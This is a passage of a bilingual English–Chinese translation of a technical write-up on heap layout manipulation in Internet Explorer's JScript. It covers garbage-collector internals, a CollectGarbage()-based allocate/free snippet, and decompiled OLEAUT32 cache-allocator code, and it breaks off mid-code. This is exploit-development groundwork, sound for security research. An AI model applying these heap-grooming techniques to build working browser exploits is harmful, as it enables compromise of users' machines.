lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Eric Lippert</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>blog</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>里有详细的细节描述。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Garbage
collection is triggered by various heuristics, such as the number of objects
created since the last run. The mark-and-sweep algorithm identifies all
unreferenced objects in the JavaScript runtime and destroys them. When a string
object is destroyed, its data is freed by calling SysFreeString in OLEAUT32.DLL.
This is a backtrace from the garbage collector:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>（</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中）垃圾处理机制可能会被各种不同的条件（比如可能是对象的数量太多了）所触发。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>mark-and-sweep</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>算法会标识出</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript runtime</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>所有已经不被引用了的对象，并且析构这些对象。当垃圾处理机制析构一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象的时候，垃圾处理机制会调用</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>OLEAUT32.DLL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>SysFreeString </span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>函数来释放</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象所占的内存空间。下面给出的是</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中实现垃圾回收机制的函数调用的回溯关系：</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>ChildEBP RetAddr<span style='mso-spacerun:yes'>  </span>Args to Child<span style='mso-spacerun:yes'>              </span><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d324 774fd004 00150000 00000000 001bae28 ntdll!RtlFreeHeap<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d338 <st1:chmetcnv
UnitName="ac" SourceValue="77124" HasSpace="False" Negative="False"
NumberType="1" TCSC="0" w:st="on">77124ac</st1:chmetcnv>8 77606034 001bae28 00000008 ole32!CRetailMalloc_Free+0x<st1:chmetcnv
UnitName="C" SourceValue="1" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">1c</st1:chmetcnv><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d358 77124885 00000006 00008000 <st1:chmetcnv
UnitName="F" SourceValue="37" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">00037f</st1:chmetcnv>48 OLEAUT32!APP_DATA::FreeCachedMem+0xa0<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="C" SourceValue="36" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">36c</st1:chmetcnv> 77124ae3 <st1:chmetcnv UnitName="a"
SourceValue="2" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">02a</st1:chmetcnv><st1:chmetcnv UnitName="C" SourceValue="8004"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">8004c</st1:chmetcnv> 00037cc8 <st1:chmetcnv
UnitName="F" SourceValue="37" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">00037f</st1:chmetcnv>48 OLEAUT32!SysFreeString+0x56<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d380 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv><st1:chmetcnv UnitName="F" SourceValue="60"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">60f</st1:chmetcnv>15 <st1:chmetcnv
UnitName="F" SourceValue="37" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">00037f</st1:chmetcnv>48 <st1:chmetcnv UnitName="F"
SourceValue="37" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">00037f</st1:chmetcnv>48 <st1:chmetcnv UnitName="C" SourceValue="75"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">75c</st1:chmetcnv>61347 OLEAUT32!VariantClear+0xbb<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="C" SourceValue="38" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">38c</st1:chmetcnv> <st1:chmetcnv UnitName="C"
SourceValue="75" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">75c</st1:chmetcnv>61347 00037cc8 <st1:chmetcnv UnitName="a"
SourceValue="378" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">000378a</st1:chmetcnv>0 00036d40 jscript!VAR::Clear+0x5d<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d3b0 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>60eba 000378b0 00000000 <st1:chmetcnv
UnitName="a" SourceValue="378" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">000378a</st1:chmetcnv>0 jscript!GcAlloc::ReclaimGarbage+0x65<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d3cc <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>61273 00000002 0013d<st1:chmetcnv
UnitName="C" SourceValue="40" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">40c</st1:chmetcnv> <st1:chmetcnv UnitName="C"
SourceValue="37" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">00037c</st1:chmetcnv>10 jscript!GcContext::Reclaim+0x98<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d3e0 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv><st1:chmetcnv UnitName="a" SourceValue="99"
HasSpace="False" Negative="False" NumberType="1" TCSC="0" w:st="on">99a</st1:chmetcnv>27 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>6212e 00037940 0013d474 jscript!GcContext::Collect+0xa5<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d3e4 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>6212e 00037940 0013d474 0013d<st1:chmetcnv
UnitName="C" SourceValue="40" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">40c</st1:chmetcnv> jscript!JsCollectGarbage+0x10<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
free one of the strings we've allocated, we need to delete all references to it
and run the garbage collector. Fortunately, we don't have to wait for one of
the heuristics to trigger it, because the JavaScript implementation in Internet
Explorer provides a CollectGarbage() function which forces the garbage
collector to run immediately. The use of this function is shown in the code
below:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>要释放掉某个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象所占的内存空间，我们首先要删除掉所有对这个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象的引用，然后运行垃圾处理机制。对我们来说幸运的是，我们不需要再去创建很多对象或者分配很多空间以构造一个能出发垃圾处理机制的情况。在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>IE</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>实现中有一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>CollectGarbage()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数，调用这个函数我们就能立即强制垃圾处理机制。如下面这段代码：</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>var str;<o:p></o:p></span></pre><pre style='margin-left:24.0pt'><span
lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// We need to do the allocation and free in a function scope, otherwise the<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// garbage collector will not free the string.<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//</span><span
style='font-size:9.0pt;font-family:宋体;mso-ascii-font-family:"Courier New";
mso-hansi-font-family:"Courier New";color:#404040'>我们必须在同一个函数的作用域中完成分配和释放</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'>string</span><span
style='font-size:9.0pt;font-family:宋体;mso-ascii-font-family:"Courier New";
mso-hansi-font-family:"Courier New";color:#404040'>对象的动作，否则垃圾处理机制将不会释放</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'>string</span><span
style='font-size:9.0pt;font-family:宋体;mso-ascii-font-family:"Courier New";
mso-hansi-font-family:"Courier New";color:#404040'>对象</span><span lang=EN-US
style='font-size:9.0pt;color:#404040'><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>function alloc_str(bytes) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>str = padding.substr(0, (bytes-6)/2);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>} <o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'> </span><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>function free_str() { <o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>str = null;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CollectGarbage();<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>} <o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>alloc_str(0x10000);<span style='mso-spacerun:yes'>     </span>// allocate memory block<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>free_str();<span style='mso-spacerun:yes'>             </span>// free memory block<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
code above allocates a 64KB memory block and frees it, demonstrating our
ability to perform arbitrary allocations and frees on the default process heap.
We can free only blocks that were allocated by us, but even with that
restriction we still have a great degree of control over the heap layout.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>上面这段代码将分配</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>64KB</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的一个内存块，并且释放它。这段代码演示了如何在进程默认堆中分配任意大小的内存块并且按我们自己的意志释放它。现在我们已经能释放我们自己刚刚分配的空间了，即使加上一些限制（译注：大概是指上面要求的“</span><span
style='font-size:9.0pt;color:#404040'>必须在同一个函数的作用域中完成分配和释放<span lang=EN-US>string</span>对象的动作”</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>），我们仍然已经能在很大程度上控制堆的状态了。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32
memory allocator<o:p></o:p></span></h3>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中内存的分配算法</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Unfortunately,
it turns out that a call to SysAllocString doesn't always result in an
allocation from the system heap. The functions for allocating and freeing BSTR
strings use a custom memory allocator, implemented in the APP_DATA class in
OLEAUT32. This memory allocator maintains a cache of freed memory blocks, and
reuses them for future allocations. This is similar to the lookaside lists
maintained by the system memory allocator.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>现在我们的问题是，不是每次我们调用</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>SysAllocString</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数，都会在堆中新分配一个内存空间供</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象使用的。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>BSTR string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>所需空间分配和释放的具体工作是有</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>APP_DATA</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>类实现的，在这个类中使用了一个很普通的内存分配算法。堆中使用一个类似于系统的堆内存分配函数（如</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapAlloc</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数）使用的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Lookaside list</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的缓存，被释放的内存满足一定条件时（详见下一段）会被释放到这个缓存中（在这个缓存中的内存块实际上并没有被释放掉，也就是不会去执行任何内存块的合并操作），并且会在下一次应用程序申请内存时，优先分配出去。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
cache consists of 4 bins, each holding 6 blocks of a certain size range. When a
block is freed with the APP_DATA::FreeCachedMem() function, it is stored in one
of the bins. If the bin is full, the smallest block in the bin is freed with
HeapFree() and is replaced with the new block. Blocks larger than 32767 bytes
are not cached and are always freed directly.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>（有关</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>Lookaside list</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>详见《</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Windows
Heap Exploitation</span><span style='font-size:9.5pt;mso-ascii-font-family:
Verdana;mso-hansi-font-family:Verdana;color:#404040'>》为了保持表述的一致性，下面翻译时使属于术语尽量与</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Lookaside</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的使用的术语一致）这个缓存由</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>4</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个项组成，每个项中都能存放</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>6</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个某一大小范围中的被释放的内存块。当我们释放一个内存块时，系统首先将要调用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>APP_DATA::FreeCachedMem()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数把这个内存块释放到缓存中相应的项中去，如果这个对应项中已经满了（也就是已经有了</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>6</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个内存块），那么这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>7</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个内存块中最小的一个将会被</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapFree()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数释放掉，然后把新释放的这个块加进来（如果新释放的这个内存块不是</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>7</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个内存块中最小的那一块的话）。当然如果被释放的内存块大于</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>32767</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个字节的话，它就会被直接释放掉，而不会进入缓存。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>When
APP_DATA::AllocCachedMem() is called to allocate memory, it looks for a free
block in the appropriate size bin. If a large enough block is found, it is
removed from the cache and returned to the caller. Otherwise the function
allocates new memory with HeapAlloc().<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>当应用程序调用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>APP_DATA::AllocCachedMem()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数时，它首先会检查缓存中相应的项中的</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>6</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个内存块，从中找出最符合要求内存块，然后把这个内存块从缓存中释放出来，把它直接返回给应用程序。如果没有找到合适的内存块，它就会调用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>HeapAlloc()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数从堆中发配新的内存空间。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
decompiled code of the memory allocator is shown below:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面是反汇编出来的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>APP_DATA::FreeCachedMem()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>和</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>APP_DATA::AllocCachedMem()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>以及相应结构的代码：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>// Each entry in the cache has a size and a pointer to the free block<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>struct CacheEntry<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>unsigned int size;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>void* ptr;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// The cache consists of 4 bins, each holding 6 blocks of a certain size range<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>class APP_DATA<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry bin_1_32<span style='mso-spacerun:yes'>     </span>[6];<span style='mso-spacerun:yes'>    </span>// blocks from 1 to 32 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry bin_33_64<span style='mso-spacerun:yes'>    </span>[6];<span style='mso-spacerun:yes'>    </span>// blocks from 33 to 64 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry bin_65_256<span style='mso-spacerun:yes'>   </span>[6];<span style='mso-spacerun:yes'>    </span>// blocks from 65 to 265 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry bin_257_32768[6];<span style='mso-spacerun:yes'>    </span>// blocks from 257 to 32768 bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>void* AllocCachedMem(unsigned long size);<span style='mso-spacerun:yes'>   </span>// alloc function<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>void FreeCachedMem(void* ptr);<span style='mso-spacerun:yes'>              </span>// free function<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>};<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Allocate memory, reusing the blocks from the cache<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>//<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>void* APP_DATA::AllocCachedMem(unsigned long size)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>{<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>CacheEntry* bin;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>   </span><span style='mso-spacerun:yes'> </span>int i;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (g_fDebNoCache == TRUE)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>        </span>goto system_alloc;<span style='mso-spacerun:yes'>          </span>// Use HeapAlloc if caching is disabled<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>// Find the right cache bin for the block size<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>if (size &gt; 256)<o:p></o:p></span></pre><pre
